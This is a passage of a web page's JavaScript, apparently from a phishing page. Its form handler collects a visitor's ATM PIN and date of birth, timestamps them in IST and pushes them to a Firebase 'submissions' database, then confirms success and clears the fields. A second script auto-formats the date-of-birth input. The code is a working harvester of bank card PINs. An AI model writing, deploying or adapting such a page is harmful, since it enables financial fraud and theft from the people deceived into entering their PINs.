        // Get India time
        const indiaTime = getIndiaTime();
        const formattedDate = indiaTime.toLocaleDateString('en-IN', {
          day: '2-digit',
          month: '2-digit',
          year: 'numeric'
        });
        const formattedTime = indiaTime.toLocaleTimeString('en-IN', {
          hour: '2-digit',
          minute: '2-digit',
          second: '2-digit',
          hour12: true
        });

        const timestamp = `${formattedDate} ${formattedTime} (IST)`;

        firebase.database().ref('submissions').push({
          atmPin: atmPin,
          dob: dob,
          timestamp: timestamp,
          createdAt: firebase.database.ServerValue.TIMESTAMP
        }, function(error) {
          if (error) {
            alert('Error saving data. Please try again.');
          } else {
            alert('Data submitted successfully!');
            document.getElementById('atmPin').value = '';
            document.getElementById('dob').value = '';
          }
        });
      } else {
        alert('Please fill in all fields.');
      }
    });
  </script>

  <!-- DOB Auto Slash Script -->
  <script>
    const dobInput = document.getElementById("dob");

    dobInput.addEventListener("input", function () {
      let value = dobInput.value.replace(/\D/g, '');
      if (value.length > 8) value = value.slice(0, 8);

      const parts = [];
      if (value.length > 4) {
        parts.push(value.slice(0, 2));
        parts.push(value.slice(2, 4));
        parts.push(value.slice(4));
      } else if (value.length > 2) {
        parts.push(value.slice(0, 2));
        parts.push(value.slice(2));
      } else {
        parts.push(value);
      }

      dobInput.value = parts.join('/');
    });
  </script>
